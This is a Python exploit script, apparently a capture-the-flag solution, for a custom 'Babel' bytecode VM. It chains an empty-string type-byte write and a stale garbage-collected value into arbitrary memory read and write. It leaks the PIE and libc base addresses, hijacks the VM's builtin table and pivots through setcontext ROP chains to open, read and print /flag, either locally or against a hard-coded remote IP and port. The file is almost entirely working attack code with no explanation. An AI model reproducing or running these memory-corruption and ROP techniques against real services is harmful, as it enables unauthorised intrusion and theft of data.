#!/usr/bin/env python3
# Babel VM exploit: empty-string type-byte write + GC stale value -> arbitrary R/W
# -> hijack builtin table -> setcontext ROP -> open/read/write /flag
import struct, socket, sys, subprocess, time, os

# ---------- offsets ----------
PIE_LEAK_OFF   = 0x590a0     # &core_table + 1*8  (builtin idx 1)
GOT_READ       = 0x58d30
LIBC_READ      = 0x11bd20
LIBC_SETCONTEXT= 0x4a960
LIBC_POP_RDI   = 0x10c08d
LIBC_POP_RSI   = 0x110b7d
LIBC_POP_RDX   = 0x8d6a
PLT_OPEN64     = 0xd380
PLT_READ       = 0xd1e0
PLT_WRITE      = 0xd610
PLT_EXIT       = 0xd1a0

# ---------- assembler ----------
class Asm:
    def __init__(self):
        self.b = bytearray()
    def imm(self, n):
        self.b += bytes([0x01]) + struct.pack("<q", n if n < 0x8000000000000000 else n - 0x10000000000000000)
        return self
    def lit(self, data):
        if isinstance(data, str): data = data.encode()
        self.b += bytes([0x02]) + struct.pack("<I", len(data)) + data
        return self
    def lit0(self): return self.lit(b"")
    def store(self, v): self.b += bytes([0x11, v & 0xff]); return self
    def load(self, v): self.b += bytes([0x10, v & 0xff]); return self
    def dup(self): self.b += bytes([0x03]); return self
    def drop(self): self.b += bytes([0x04]); return self
    def add(self): self.b += bytes([0x05]); return self
    def sub(self): self.b += bytes([0x06]); return self
    def mul(self): self.b += bytes([0x07]); return self
    def mktuple(self, n): self.b += bytes([0x08]) + struct.pack("<I", n); return self
    def getidx(self, i): self.b += bytes([0x0a]) + struct.pack("<I", i); return self
    def setidx(self, i): self.b += bytes([0x0b]) + struct.pack("<I", i); return self
    def getbyte(self, i): self.b += bytes([0x0c]) + struct.pack("<I", i); return self
    def setbyte(self, i): self.b += bytes([0x0d]) + struct.pack("<I", i); return self
    def printv(self): self.b += bytes([0x12]); return self
    def write8(self): self.b += bytes([0x13]); return self
    def mk_builtin(self, idx): self.b += bytes([0x14, idx & 0xff]); return self
    def mk_buffer(self, size): self.b += bytes([0x16]) + struct.pack("<I", size); return self
    def rdbuf(self, i): self.b += bytes([0x17]) + struct.pack("<I", i); return self
    def wrbuf(self, i): self.b += bytes([0x18]) + struct.pack("<I", i); return self
    def tabstore(self): self.b += bytes([0x19]); return self
    def callb(self, idx, n): self.b += bytes([0x20, 0x00, idx & 0xff, n & 0xff]); return self
    def halt(self): self.b += bytes([0xfe]); return self

def frame(payload):
    return struct.pack("<I", len(payload)) + payload

# ---------- frame 1a: PIE leak ----------
def build_frame1a():
    a = Asm()
    a.lit0()
    a.imm(0).imm(0).mktuple(2)
    a.store(10).store(11)
    a.imm(0).imm(0).mktuple(2)
    a.store(12)
    a.mk_builtin(1)
    a.store(13)
    a.load(10).load(12).setidx(1)
    a.load(11).imm(0).setbyte(0)
    a.imm(0).store(12)
    a.lit(b"G" * 0x8000)
    a.store(14)
    a.load(10).getidx(1).getidx(0)
    a.store(0)
    a.load(0).write8()
    a.halt()
    return bytes(a.b)

# ---------- frame 1b: stale tag-9 handle + libc leak ----------
def build_frame1b():
    a = Asm()
    a.lit0()
    a.imm(0).imm(0).mktuple(2)
    a.store(20).store(21)
    a.mk_buffer(0)
    a.store(22)
    a.imm(0).imm(0).mktuple(2)
    a.store(23)
    a.load(20).load(22).setidx(1)
    a.load(21).imm(0).setbyte(0)
    a.imm(0).store(22)
    a.lit(b"H" * 0x8000)
    a.store(24)
    a.load(20).getidx(1)
    a.store(30)
    a.load(0).imm(0x590a0 // 2).sub().store(1)
    a.load(1).imm(GOT_READ // 2).add().store(2)
    a.load(30).load(2).dup().add().tabstore()
    a.imm(0).store(3)
    for i in range(7, -1, -1):
        a.load(3).imm(256).mul()
        a.load(30).rdbuf(i)
        a.add().store(3)
    a.load(3).write8()
    a.halt()
    return bytes(a.b)

# ---------- frame 2 ----------
UCTX   = 0x59010     # rdi passed by VM to builtin
LAY_FP = 0x59200
LAY_PATH = 0x59280
C1     = 0x59300
UC2    = 0x59400
C2     = 0x59600
UC3    = 0x59700
C3     = 0x59900
FLAGB  = 0x59a00

def build_frame2(base, libc):
    a = Asm()
    W = base + 0x59000
    def wr(addr, data):
        idx = addr - W
        assert 0 <= idx < 0x100000, hex(idx)
        for byte in data:
            a.load(30).imm(byte).wrbuf(idx)
            idx += 1
    def wq(addr, val):
        wr(addr, struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF))
    def uctx(off, rdi, rsi, rdx, rsp, rip):
        u = base + off
        fp = base + LAY_FP
        wq(u + 0x28, 0)
        wq(u + 0x30, 0)
        wq(u + 0x68, rdi)
        wq(u + 0x70, rsi)
        wq(u + 0x88, rdx)
        wq(u + 0x98, 0)
        wq(u + 0xa0, rsp)
        wq(u + 0xa8, rip)
        wq(u + 0xe0, fp)
        wr(u + 0x1c0, struct.pack("<I", 0))
    # buffer slot 0 -> base+0x59000
    a.load(30).imm(W).tabstore()
    PATH = base + LAY_PATH
    FB = base + FLAGB
    pop_rdi = libc + LIBC_POP_RDI
    setctx = libc + LIBC_SETCONTEXT
    wr(PATH, b"/flag" + bytes([0]))
    wr(base + LAY_FP, bytes(32))
    # stage 1: open("/flag", 0, 0)
    uctx(UCTX, PATH, 0, 0, base + C1, base + PLT_OPEN64)
    wq(base + C1 + 0, pop_rdi)
    wq(base + C1 + 8, base + UC2)
    wq(base + C1 + 16, setctx)
    # stage 2: read(3, FLAGB, 0x200)
    uctx(UC2, 3, FB, 0x200, base + C2, base + PLT_READ)
    wq(base + C2 + 0, pop_rdi)
    wq(base + C2 + 8, base + UC3)
    wq(base + C2 + 16, setctx)
    # stage 3: write(1, FLAGB, 0x200)
    uctx(UC3, 1, FB, 0x200, base + C3, base + PLT_WRITE)
    wq(base + C3 + 0, pop_rdi)
    wq(base + C3 + 8, 0)
    wq(base + C3 + 16, base + PLT_EXIT)
    # B2[0] = 8 -> builtin table index 8 -> builtin[0]
    a.load(23).imm(4).setidx(0)
    a.load(30).imm(setctx).tabstore()
    a.callb(0, 0)
    a.halt()
    return bytes(a.b)

def parse_leaks(buf):
    # frame1 outputs 8 bytes pie leak then 8 bytes 2*libc_read
    assert len(buf) >= 16, buf
    pie_leak = struct.unpack("<Q", buf[0:8])[0]
    libc_read_x2 = struct.unpack("<Q", buf[8:16])[0]
    base = pie_leak - PIE_LEAK_OFF
    libc_read = libc_read_x2 // 2
    libc = libc_read - LIBC_READ
    return base, libc

def run_local(binary="./babel"):
    f1a = build_frame1a(); f1b = build_frame1b()
    print("[*] frame1a len", len(f1a), "frame1b len", len(f1b))
    p = subprocess.Popen([binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.stdin.write(frame(f1a)); p.stdin.flush()
    leak1 = p.stdout.read(8)
    print("[+] leak1", leak1.hex())
    p.stdin.write(frame(f1b)); p.stdin.flush()
    leak2 = p.stdout.read(8)
    print("[+] leak2", leak2.hex())
    if len(leak1) != 8 or len(leak2) != 8:
        print("[-] leak failed"); return
    base = struct.unpack("<Q", leak1)[0] - PIE_LEAK_OFF
    libc = struct.unpack("<Q", leak2)[0] // 2 - LIBC_READ
    print("[+] pie base = %#x  libc base = %#x" % (base, libc))
    f2 = build_frame2(base, libc)
    print("[*] frame2 len", len(f2))
    p.stdin.write(frame(f2)); p.stdin.flush()
    time.sleep(1.0)
    import os, fcntl
    fcntl.fcntl(p.stdout, fcntl.F_SETFL, os.O_NONBLOCK)
    try: out = p.stdout.read() or b""
    except Exception: out = b""
    time.sleep(0.2)
    try: out += p.stdout.read() or b""
    except Exception: pass
    try: err = p.stderr.read() or b""
    except Exception: err = b""
    print("[+] out:", out)
    print("[+] err:", err[:200])
    p.kill()

def run_remote(host, port):
    s = socket.create_connection((host, port), timeout=10)
    def rx(n):
        buf = b""
        while len(buf) < n:
            d = s.recv(n - len(buf))
            if not d: break
            buf += d
        return buf
    s.sendall(frame(build_frame1a()))
    leak1 = rx(8)
    print("[+] leak1", leak1.hex())
    s.sendall(frame(build_frame1b()))
    leak2 = rx(8)
    print("[+] leak2", leak2.hex())
    if len(leak1) != 8 or len(leak2) != 8:
        print("[-] leak failed"); return
    base = struct.unpack("<Q", leak1)[0] - PIE_LEAK_OFF
    libc = struct.unpack("<Q", leak2)[0] // 2 - LIBC_READ
    print("[+] pie base = %#x  libc base = %#x" % (base, libc))
    s.sendall(frame(build_frame2(base, libc)))
    s.settimeout(5)
    out = b""
    try:
        while True:
            d = s.recv(0x400)
            if not d: break
            out += d
            if len(out) > 0x800: break
    except Exception:
        pass
    print("[+] out:", out)
    s.close()

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "local"
    if mode == "local":
        run_local()
    else:
        run_remote("39.105.35.192", 24682)
